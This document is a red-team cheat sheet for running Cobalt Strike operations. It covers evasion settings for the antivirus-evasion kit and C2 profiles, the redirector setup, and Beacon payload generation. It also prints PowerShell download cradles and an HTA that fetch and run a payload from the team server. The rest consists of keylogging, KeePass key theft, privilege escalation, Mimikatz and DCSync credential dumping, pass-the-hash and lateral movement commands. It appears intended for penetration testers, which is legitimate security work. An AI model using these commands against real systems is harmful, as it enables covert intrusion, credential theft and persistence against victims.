Cobalt Strike


Use the following install location: /opt/cobaltstrike/
    This will allow you to get third-party apps installed when running /opt/discover/update.sh

- Update
cd /opt/cobaltstrike/
./update

- Arsenal Kit
https://download.cobaltstrike.com/scripts

Included Kits:
    Artifact Kit - a source code framework to build executables and DLLs that evade some anti-virus products.
    Mimikatz Kit
    Process Injection Kit
    Resource Kit
    Sleep Mask Kit
    User Defined Reflective Loader Kit

tar -zxvf /home/kali/Downloads/arsenal-kit20220613.tgz
cd arsenal-kit/
vi arsenal_kit.config                             Make the following changes.
include_udrl_kit="true"
include_sleepmask_kit="true"
include_process_inject_kit="true"
include_resource_kit="true"
include_mimikatz_kit="true"
artifactkit_stage_size=412256                     BokuLoader recommended size.

./build_arsenal_kit.sh

- OPSEC - add the following options to your Malleable C2 profile:
set pipename            "changeme##";             The default SMB Beacon named pipe is msagent_##.
set ssh_banner          "changeme";               The dafault SSH banner is Cobalt Strike 4.2.
set ssh_pipename        "changeme";               The default SSH Beacon named pipe is \\.\pipe\postex_ssh_####.

https-certificate {
    Change the location options.

stage {
    set userwx          "false";
    set stomppe         "true";
    set obfuscate       "true";
    set name            "changeme.dll";
    set cleanup         "true";
    set sleep_mask      "true";
    set smartinject     "true";

process-inject {
    set allocator       "NtMapViewOfSection";
    set userwx          "false";
    set smartinject     "true";

post-ex {
    set spawnto_x86 "%windir%\\SYSWOW64\\dllhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set obfuscate       "true";
    set smartinject     "true";
    set amsi_disable    "true";
    set pipename "changeme_####, win\\changeme_##";

Be sure to review malleable-c2-profiles/normal/reference.profile for more default settings.

- Remove old data and Beacons (optional)
Stop the team server.
rm -rf data/

- Start the team server
Start a screen or tmux session.

Parameters in <> are mandatory, those in [] are optional
./teamserver <IP> <password> [Malleable C2 profile] [kill date for Beacons yyyy-mm-dd]
./teamserver 192.168.1.5 password malleable-c2-profiles/APT/etumbot.profile 2022-12-31

When the team server starts, it will display the SHA256 hash of the SSL cert. Verify this hash when connecting.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Connecting to the team server

- Locally
Right-click in the Terminal > Split Terminal Horizontally
cd /opt/cobaltstrike/
./cobaltstrike
Host: 127.0.0.1
Port: 50050
User: <your name>
Password: <password you entered above>
Connect
Verify Fingerprint (SHA256 hash from above) > Yes

- Remote connection
OPSEC: Never expose port 50050 directly to the internet. Always use SSH and locally forward the connection.
ssh -f -N -L 50050:127.0.0.1:50050 user@teamserver
Follow the steps from above.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Redirectors (passthroughs)

OPSEC: Never allow a Beacon to make direct connections to your team server. Always use a redirector to forward the traffic.

- Create 3 free Ubuntu instances in the cloud. These instances will be used for the following:
Redirector 1 - HTTP
Redirector 2 - HTTPS
Redirector 3 - DNS

- Install socat on each instance
sudo -i
apt-get install -y socat
screen
socat tcp4-listen:80,fork tcp4:<team server IP>:80 &                   Redirector 1
socat tcp4-listen:443,fork tcp4:<team server IP>:443 &                 Redirector 2
socat udp4-recvfrom:53,reuseaddr,fork udp4-sendto:<team server IP>     Redirector 3
------------------------------------------------------------------------------------------------------------------------------------------------------

# Valid SSL certificate for Beacon 

Create a Java Keystore file. Use the fully qualified domain name of your Beacon server.
keytool -genkey -keyalg RSA -keysize 2048 -keystore domain.store

Generate a Certificate Signing Request (CSR). Submit this file to your SSL certificate vendor. 
They will verify that you are who you say are and issue a certificate.
keytool -certreq -keyalg RSA -file domain.csr -keystore domain.store

Import the Root and any Intermediate Certificates that your SSL vendor provides.
keytool -import -trustcacerts -alias FILE -file FILE.crt -keystore domain.store

Install your Domain Certificate.
keytool -import -trustcacerts -alias mykey -file domain.crt -keystore domain.store
 
Cobalt Strike expects to find the Java Keystore file in the same folder as your Malleable C2 profiles.
/opt/cobaltstrike/malleable-c2-profiles
------------------------------------------------------------------------------------------------------------------------------------------------------

# Create listeners

Cobalt Strike > Listeners > Add
Name: http
Payload: Beacon HTTP
HTTP Hosts: click + <Redirector1 IP> > OK
Save > OK

Add
Name: https
Payload: Beacon HTTPS
HTTPS Hosts: click + <Redirector2 IP>
Save > OK

Add
Name: dns
Payload: Beacon DNS
DNS Hosts: click + <Redirector3 IP>
Save > OK

Peer-to-peer listeners allow Beacons to chain their comms together over SMB or TCP.
This is needed when a target you compromised cannot reach your team server directly over HTTP.

Add
Name: smb
Payload: Beacon SMB
Save > OK
------------------------------------------------------------------------------------------------------------------------------------------------------

# Launch an attack to gain a foothold.

OPSEC: Staged payloads tend to have more indicators compared to stageless.
Always prefer a fully staged or stageless payload and disable payload staging.
(S) in the framework refers to a stageless payload.

- Disable Windows Defender on your target Windows VM
Enterprise: Windows Security > Virus & threat protection > Manage settings > turn off Real-time protection > Yes
Standard: Windows Defender settings > turn off Real-time protection

- Generate a payload
Attacks > Packages > Windows Executable (S)
Listener: select the http listener > Choose
Output: Windows EXE
Use x64 payload
Generate
Select the location for the payload > Save > OK

Transfer the payload to your target and execute.
Click on Cobalt Strike and you will see a Beacon session appear in the top pane.

- Interact with Beacon
Right-click on the Beacon > Interact
help                                              Show available help commands
help <command>                                    Get more help on a particular command
ctrl +/-                                          Increase or decrease the font size
ctrl k                                            Clear the tab

- By default, Beacon will check in every 60 seconds.
sleep 0                                           Make Beacon interactive
sleep 2                                           Make Beacon call home every 2 seconds
sleep 30 10                                       Make Beacon call home every 30 seconds with a 10% jitter

Right-click on the X in the tab for additional options.
------------------------------------------------------------------------------------------------------------------------------------------------------

# HTML Application (HTA)

An HTA is a proprietary Windows program whose source code consists of HTML and one or more scripting languages supported by Internet Explorer
(VBScript and JScript). The HTML is used to generate the user interface and the scripting language for the program logic. An HTA executes without
the constraints of the browser's security model, so it executes as a "fully trusted" application.

Attacks > Web Drive-by > Scripted Web Delivery (S)
URI Path: /a
Local Host: same IP as your server
Local Port: 80
Listener: select the http listener > Choose
Type: powershell
Use x64 payload
Launch

Copy the download cradle provided > OK
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:80/a'))"

Open a Command Prompt on your Windows VM and execute the download cradle.

Click on Cobalt Strike and you will see a Beacon session appear in the top pane.

- Example 2
Create a new file text file on a Windows VM called test.hta and paste in the following:
<html>
    <head>
      <title>Hello World</title>
    </head>
    <body>
      <h2>Hello World</h2>
      <p>This is an an HTA example.</p>
    </body>

    <script language="VBScript">
      Function Pwn()
        Set shell = CreateObject("wscript.Shell")
        shell.run "calc"
      End Function

      Pwn
    </script>
</html>

Make sure real-time protection is turned off.
Open a Command Promtp: rename test.hta.txt test.hta
Execute the file to see the document and calc open.
Now replace the "calc" with the download cradle from above and force mshta to use the 64-bit version of PowerShell.

shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.1.5/a'))"""
------------------------------------------------------------------------------------------------------------------------------------------------------

- Clean up
exit
Right click on the Beacon > Session > Remove
Attacks > Web Drive-by > Manage
Select each line > Kill
Listeners > Restart > OK

- Attack 3
Attacks > Packages > HTML Application
Listener: Initial access > Choose
Method: Executable
Generate
/root/evil.hta
Save > OK

Attacks > Web Drive-by > Host File
File: /root/evil.hta > Open
Local URI: /survey.txt
Local Host: 192.168.1.5
Local Port: 80
Mime Type: automatic
Launch > OK

Copy the URI provided > OK

Open Internet Explorer on your Windows VM to http://192.168.1.5/survey.txt
Open > Allow
Click on Cobalt Strike and you will see a Beacon session appear in the top pane.
------------------------------------------------------------------------------------------------------------------------------------------------------

View > Web Log
This is helpful to know when HTTP requests are hitting your team server.
Use the up arrow to scroll through previous commands.
Beacon is fully tab-completable.
All commands and their output are written to the logs directory.
ctrl+k will clear the current window.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Enumeration

- Beacon Object Files (BOF)
A compiled C program that executes within Beacon and can call Win32 and Beacon APIs without spawning and injecting into a new process.

Cobalt Strike > Script Manger > Load:
/opt/cobaltstrike/third-party/outflanknl-helpcolor/HelpColor.cna
/opt/cobaltstrike/third-party/trustedsec-bof/SA/SA.cna

helpx                                             New commands are added and OPSEC color coded.
whoami
userenum

keylogger <PID> x64                               Inject a keystroke logger into a process
                                                  View > Keylogger > select item in lower left pane

https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Start-ClipboardMonitor.ps1
psinject <PID> x64 Start-ClipboardMonitor -CollectionLimit 5

screenshot <PID> x64                              Take a screenshot
                                                  View > Screenshots > select item in lower left pane

- KeeThief
https://github.com/GhostPack/KeeThief
powershell Get-KeePassDatabaseKey

- PowerShell weaponization
powershell <cmdlet> <args>                        Starts powershell.exe and uses the highest supported PowerShell version
powerpick <cmdlet> <args>                         Spawns a sacrificial process specified by spawnto and injects UnmanagedPowerShell into it
psinject <PID> <arch> <cmdlet> <args>             Injects UnmanagedPowerShell into the specified process
------------------------------------------------------------------------------------------------------------------------------------------------------

# Privilege Escalation

getsystem                                         SYSTEM account impersonation using named pipes
elevate svc-exe                                   Creates a SYSTEM service that will run our payload
elevate uac-token-duplication                     Bypass UAC, this gives you a pseudo-high integrity token

- PowerUp
powershell-import /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
powerpick Invoke-PrivescAudit

Example output
ServiceName   : BetaSvc
Path          : C:\Temp\vuln.exe
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'BetaSvc'
CanRestart    : Trun
Name          : BetaSvc
Check         : Modifiable Services

- attack 1
powerpick Invoke-ServiceAbuse -Name 'BetaSvc'
spawnas john Password123! smb
Select john in the top pane > right-click > Interact
bypassuac http
john should now be running in a high integrity Beacon (see asterisk)

- attack 2
We can exploit this misconfiguration by replacing the exe with our own exe that will launch a Beacon.
ls C:\Temp    See if the vulnerable exe exists.
If not, we can upload our malicous exe to that location without having to delete files or modify the service config.

Attacks > Packages > Windows Executable (S)
Stage: select your stage
Output: Windows Service EXE
Generate
 
cd C:\Temp                                        Change to the target directory.
upload /root/vuln.exe                             Upload our payload.
ls                                                Verify the payload was uploaded.
run sc start BetaSvc                              Start the service. You should have a new Beacon running as SYSTEM.

- SharpUp
execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/SharpUp.exe

- Seatbelt
execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=system
execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=user
------------------------------------------------------------------------------------------------------------------------------------------------------

# Credential Abuse

- Double-hop workarounds
1. Use a token that points to a non-network logon session
steal_token <PID>
inject <PID> x64 <listener>

2. Create a new token and logon session that has creds
make_token <DOMAIN\user> <password>
spawnas <DOMAIN\user> <password> <listener>
pth <DOMAIN\user> <hash>

- Mimikatz
::                                                Show parent modules.
sekurlsa::                                        Show submodules for a given parent.
privilege::debug
token::elevate
sekurlsa::logonPasswords

lsadump::<module>                                 Interact with the Local Security Authority (LSA).
    ::sam                                         Local account hashes from the SAM database using the registry.
    ::lsa                                         Local account hashes via the LSA APIs (and domain hashes on DCs).
    ::cache                                       Domain cached credentials on the system.
    ::secrets                                     LSA Secrets (ex: service account passwords).
    ::dcsync /user:<DOMAIN\user>

execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe LSASettings
execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe CredGuard

execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q SecPackageCreds
execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe dump

hashdump                                          Recover local account password hashes.
logonpasswords                                    Harvest credentials with mimikatz.
View > Credentials
------------------------------------------------------------------------------------------------------------------------------------------------------

# Lateral movement

schtasks /create /s <IP> /tn <name> /u <user> /sc <frequency> /p <password> /st <time> /sd <date> <command>
sc \\IP create Service binPath= "command"
wmic /node:target.domain process call create "C:\Windows\System32\cmd.exe /c beacon.exe"

jump wmi_msbuild <target> <listener>

- Double-hop options
make_token <DOMAIN\user> <password>
inject <PID> x64 <listener>
steal_token <PID>
pth <DOMAIN\user> <hash>
spawnas <DOMAIN\user> <password> <listener>

socks <port>                                      Opens a port on the team server. Be sure to restrict access.
proxychains <tool/options>
/etc/proxychains.conf                             Edit your attack VM’s config to your team server IP and port.
proxychains xfreerdp /u:<DOMAIN\user> /p:<password> /v:<IP>

jump psexec                                       Run service EXE on remote host
jump psexec_psh                                   Run a PowerShell one-liner on remote host via a service
jump winrm                                        Run a PowerShell script via WinRM on remote host
remote-exec <any of the above>                    Run a single command using the above methods on remote host

make_token <DOMAIN\user> <password>
powershell-import /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
powerpick get-domainuser <user>
powerpick Get-DomainComputer -Ping -Properties dnshostname
powerpick Get-NetLocalGroupMember <computer>      List the local administrators group on a computer.
ls \\<computer>\C$                                Check to see if you have access.
jump <psexec, psexec64, winrm, winrm64> <computer> <listener>
------------------------------------------------------------------------------------------------------------------------------------------------------

# Process injection

ps                                                Look for another user that is logged in.
inject <PID> <arch> <listener>
dllinject <PID>                                   Reflective DLL injection.
dllload <PID>                                     Loading an on-disk DLL to memory.
spawnto <arch> <full-exe-path>                    Process hollowing.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Remotely execute a DLL

upload /tmp/beacon.dll                            Upload your malicious DLL.
ls                                                Verify it was uploadted.
remote-exec wmi <FQDN> rundll32 c:\windows\temp\beacon.dll,start
------------------------------------------------------------------------------------------------------------------------------------------------------

# Active Directory

nltest /dsgetdc:<domain>                          Show all domain controllers in a given domain.
nltest /domain_trusts /all_trusts                 Show add domain trusts for the current domain.

- PowerView
Get-Forest                                        Show the forest object for the current forest.
Get-ForestDomain                                  Show all domains for a forest.
Get-DomainTrust                                   Show all domain trusts for the current domain or a specified domain.
Get-ForestTrust                                   Show all forest trusts for the current forest or a specified forest.

Get-DomainComputer -Domain <test.domain>          Find a computer in a trusted domain.
Get-DomainUser -Domain <dev.domain>               Find a user in a trusted domain.
Get-DomainTrustMapping | Export-CSV -NoTypeInformation trusts.csv



